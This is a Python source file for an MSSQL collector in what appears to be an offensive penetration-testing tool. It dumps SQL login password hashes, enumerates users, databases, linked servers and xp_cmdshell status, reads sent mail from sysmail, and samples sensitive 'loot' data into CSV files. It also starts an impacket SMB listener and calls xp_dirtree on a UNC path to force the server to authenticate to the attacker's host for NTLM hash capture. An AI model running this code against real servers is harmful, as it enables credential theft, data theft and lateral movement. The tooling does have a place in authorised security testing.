import mssql_python
import secrets
import threading
import os
from impacket import smbserver
from collectors.base import BaseCollector

GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"

class MSSQLCollector(BaseCollector):
    def __init__(self, target, port, user, password, skip_data, columns):
        self.target = target
        self.connection = f'{target},{port}'
        self.user = user
        self.password = password
        self.skip_data = skip_data
        self.columns = columns

        self.type = 'mssql'

        self.dir_name = f'{self.target.replace('.', '-')}_{self.type}_{secrets.token_hex(2)}'

        self.version_query = 'SELECT @@VERSION'
        self.hash_query = 'SELECT name, password_hash FROM sys.sql_logins'
        self.user_query = 'SELECT name, is_disabled FROM sys.server_principals'
        self.db_name_query = 'SELECT name FROM sys.databases WHERE database_id > 4'
        self.cmd_exec_query = 'SELECT name, value_in_use FROM sys.configurations WHERE name = \'xp_cmdshell\';'
        self.sys_query = 'SELECT IS_SRVROLEMEMBER(\'sysadmin\');'
        self.conn_query = 'EXEC sp_who2'
        self.link_query = 'SELECT name AS LinkedServerName, product AS Product, provider AS Provider, data_source AS RemoteAddress, is_remote_login_enabled AS RemoteLogin, modify_date FROM sys.servers WHERE is_linked = 1'

        self.dbs = {}
        self.findings = {"columns": [], "tables": []}
        self.matches = []

    def createConnection(self, database):
        # TODO: make option to specify database. This changes execution of script
        if database != '':
            database = f'Database={database};'

        conn_str = f"SERVER={self.connection};{database}UID={self.user};PWD={self.password};Encrypt=yes;TrustServerCertificate=yes;"
        conn = mssql_python.connect(conn_str)
        self.cursor = conn.cursor()
    
    def getAllTables(self):
        with open(f'{self.dir_name}/tables.csv', 'w') as f:
            f.write("TableName,SchemaName,Database\n")
        for db in self.dbs:
            table_query = f'SELECT TABLE_NAME, TABLE_SCHEMA FROM {db}.INFORMATION_SCHEMA.TABLES'
            self.getTables(table_query, db)
    
    def getAllColumns(self):
        with open(f'{self.dir_name}/columns.csv', 'w') as f:
            f.write('ColumnName,TableName,Database\n')
        for db in self.dbs:
            column_query = f'SELECT COLUMN_NAME, TABLE_SCHEMA, TABLE_NAME, TABLE_CATALOG FROM {db}.INFORMATION_SCHEMA.COLUMNS'
            self.getColumns(column_query, db)
    
    def getAllDBPrivs(self):
        for db in self.dbs:
            self.checkDBPrivs(db)
    
    def checkSysmail(self):
        sysmail_query = 'SELECT TOP 10 recipients, subject, body FROM msdb.dbo.sysmail_allitems'
        
        try:
            self.cursor.execute(sysmail_query)
            rows = self.cursor.fetchall()

            if not rows:
                print(f'{GREEN}No sent emails in sysmail{RESET}')
                return
            else:
                with open(f'{self.dir_name}/emails_10.csv', 'a') as f:
                    f.write('Recipients,Subject,Body\n')
                    for row in rows:
                        f.write(f'{row[0]},{row[1]},{row[2]}\n')
                print(f'{YELLOW}10 emails written to emails_10.csv!{RESET}')

        except mssql_python.exceptions.ProgrammingError:
            print(f'{RED}User does not have access to sysmail{RESET}')

    def getAllLoot(self):
        for db in self.dbs:
            self.createConnection(db)
            self.findLoot(db)
        if self.columns:
            self.findings['columns'] = self.matches
        else:
            self.findings['tables'] = self.matches

        with open(f'{self.dir_name}/findings.csv', 'a') as f:
            if self.columns:
                f.write('ColumnName,TableName,Database,SampleData\n')
                for item in self.findings['columns']:
                    f.write(f'{item['ColumnName']},{item['TableName']},{item['Database']},{item['SampleData']}\n')
            else:
                f.write('TableName,Database,SampleRow\n')
                for item in self.findings['tables']:
                    f.write(f'{item['TableName']},{item['Database']},')
                    for record in item['SampleRow']:
                        f.write(f'|{record}')
                    f.write(f'\n')

    
    def coerceXpDirtree(self, local_ip):
        server = smbserver.SimpleSMBServer(listenAddress=local_ip, listenPort=445)
        server.setSMBChallenge('1122334455667788')
        server.addShare('SHARE', '/tmp', 'Coerce Share')

        print(f'SMB listener active on {local_ip}:445. Awaiting connection...')

        try:
            server.start()
        except Exception as e:
            print(f'{RED} SMB Server Error: {e}{RESET}')

    # TODO: Test these in a live environment. Testing against docker doesnt seem to work right
    def startSMBServer(self, local_ip):
        smb_thread = threading.Thread(target=self.coerceXpDirtree, args=(local_ip,), daemon=True)
        smb_thread.start()

        unc_path = f"\\\\{local_ip}\\coerce_share\\test.txt"
        xp_dirtree_query = f'EXEC master..xp_dirtree \'{unc_path}\', 1, 1'
        try:
            self.cursor.execute(xp_dirtree_query)
            rows = self.cursor.fetchall()
            print(rows)
        except Exception as e:
            print(f'{RED}SQL Error: {e}{RESET}')